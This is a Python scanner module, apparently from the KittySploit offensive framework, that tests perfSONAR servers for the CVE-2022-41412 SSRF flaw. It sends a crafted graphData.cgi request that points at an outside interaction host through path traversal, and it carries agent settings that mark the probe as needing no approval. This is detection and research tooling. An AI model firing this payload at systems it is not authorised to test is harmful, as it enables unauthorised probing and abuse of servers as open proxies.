#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""An issue in the graphData."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'perfSONAR 4.x <= 4.4.4 - Server-Side Request Forgery Detection',
        'description': 'An issue in the graphData.cgi component of perfSONAR v4.4.5 and prior allows attackers to access sensitive data and execute Server-Side Request Forgery (SSRF) attacks.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'ssrf', 'hackerone', 'packetstorm', 'perfsonar', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/renmizo/CVE-2022-41412',
            'https://hackerone.com/reports/2445802',
            'https://github.com/perfsonar/graphs/commit/463e1d9dc30782d9b1c002143551ec78b74e03bb',
            'https://www.perfsonar.net/releasenotes-2022-09-20-4-4-5.html',
            'http://packetstormsecurity.com/files/170069/perfSONAR-4.4.4-Open-Proxy-Relay.html',
        ],
        'cve': 'CVE-2022-41412',
    }

    def run(self):
        r = self.http_request(method="GET", path='/perfsonar-graphs/cgi-bin/graphData.cgi?action=ma_data&url=http://oast.fun/esmond/perfsonar/archive/../../../&src=8.8.8.8&dest=8.8.4.4', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('<h1> Interactsh Server </h1>',)
        if (any(m in body for m in body_any)):
            self.set_info(
                severity='high',
                reason="perfSONAR 4.x <= 4.4.4 - Server-Side Request Forgery detected",
                path='/perfsonar-graphs/cgi-bin/graphData.cgi?action=ma_data&url=http://oast.fun/esmond/perfsonar/archive/../../../&src=8.8.8.8&dest=8.8.4.4',
            )
            return True
        return False

